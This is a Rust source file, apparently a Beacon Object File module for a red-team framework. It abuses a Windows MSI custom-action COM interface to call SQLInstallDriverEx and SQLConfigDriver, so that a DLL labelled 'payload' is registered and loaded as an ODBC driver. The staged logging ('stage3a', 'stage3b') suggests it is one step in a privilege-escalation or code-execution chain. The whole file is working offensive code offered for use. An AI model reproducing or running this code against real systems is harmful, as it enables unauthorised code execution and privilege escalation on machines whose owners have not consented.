#![allow(unsafe_op_in_unsafe_fn)]

use core::ptr::null;
use windows_sys::core::HRESULT;
use windows_sys::Win32::UI::Shell::{PathFindFileNameW, PathRemoveFileSpecW};
use rustbof::{eprintln, println};

use crate::vtbl::IMsiCustomAction;

unsafe fn wlen(mut p: *const u16) -> usize {
    if p.is_null() { return 0; }
    let mut n = 0; while *p != 0 { n += 1; p = p.add(1); } n
}

unsafe fn wcopy(mut dst: *mut u16, mut src: *const u16) -> *mut u16 {
    while *src != 0 { *dst = *src; dst = dst.add(1); src = src.add(1); }
    *dst = 0; dst
}

unsafe fn build_block(
    drivername: *const u16, dll_filename: *const u16, out: &mut [u16; 512],
) -> i32 {
    let pfx_drv = [b'D' as u16, b'r' as u16, b'i' as u16, b'v' as u16, b'e' as u16, b'r' as u16, b'=' as u16];
    let pfx_set = [b'S' as u16, b'e' as u16, b't' as u16, b'u' as u16, b'p' as u16, b'=' as u16];
    let s1 = wlen(drivername);
    let sf = wlen(dll_filename);
    let s2 = pfx_drv.len() + sf;
    let s3 = pfx_set.len() + sf;

    let mut p = out.as_mut_ptr();
    p = wcopy(p, drivername); p = p.add(1);
    for &c in &pfx_drv { *p = c; p = p.add(1); }
    p = wcopy(p, dll_filename); p = p.add(1);
    for &c in &pfx_set { *p = c; p = p.add(1); }
    p = wcopy(p, dll_filename); p = p.add(1);
    *p = 0;
    (s1 + 1 + s2 + 1 + s3 + 1 + 1) as i32
}

pub unsafe fn run(
    action: *mut IMsiCustomAction, drivername: *const u16, dllpath: *const u16,
) -> Result<(), HRESULT> {
    let file = PathFindFileNameW(dllpath);
    let mut dir = [0u16; 260];
    let n = wlen(dllpath).min(259);
    for i in 0..n { dir[i] = *dllpath.add(i); }
    dir[n] = 0;
    PathRemoveFileSpecW(dir.as_mut_ptr());
    println!("payload.dir=@{:p}", dir.as_ptr());
    println!("payload.file=@{:p}", file);

    let mut info = [0u16; 512];
    let n_bytes = build_block(drivername, file, &mut info);

    let mut refs: u32 = 0;
    let mut raw_rc: i32 = 0;
    let mut path_out = [0u16; 256];
    let mut path_out_len: u16 = 0;

    println!("stage3a");
    let hr = ((*(*action).lpVtbl).SQLInstallDriverEx)(
        action, n_bytes, info.as_ptr(), dir.as_ptr(),
        path_out.as_mut_ptr(), path_out.len() as u16, &mut path_out_len,
        2, &mut refs, &mut raw_rc,
    );
    if hr < 0 || raw_rc == 0 {
        let mut ec: u32 = 0; let mut em = [0u16; 256]; let mut eml: u16 = 0;
        ((*(*action).lpVtbl).SQLInstallerError)(action, 1, &mut ec, em.as_mut_ptr(), em.len() as u16, &mut eml);
        eprintln!("stage3a rc=0x{:08X} code={}", hr as u32, raw_rc);
        return Err(hr);
    }
    println!("stage3a ok refs={}", refs);

    println!("stage3b");
    let mut msg = [0u16; 256]; let mut msg_len: u16 = 0; let mut cfg_rc: i32 = 0;
    let hr = ((*(*action).lpVtbl).SQLConfigDriver)(
        action, 1, drivername, null(), msg.as_mut_ptr(), msg.len() as u16, &mut msg_len, &mut cfg_rc,
    );
    if hr < 0 {
        let mut ec: u32 = 0; let mut em = [0u16; 256]; let mut eml: u16 = 0;
        ((*(*action).lpVtbl).SQLInstallerError)(action, 1, &mut ec, em.as_mut_ptr(), em.len() as u16, &mut eml);
        eprintln!("stage3b rc=0x{:08X}", hr as u32);
        return Err(hr);
    }
    println!("stage3b ok");
    Ok(())
}
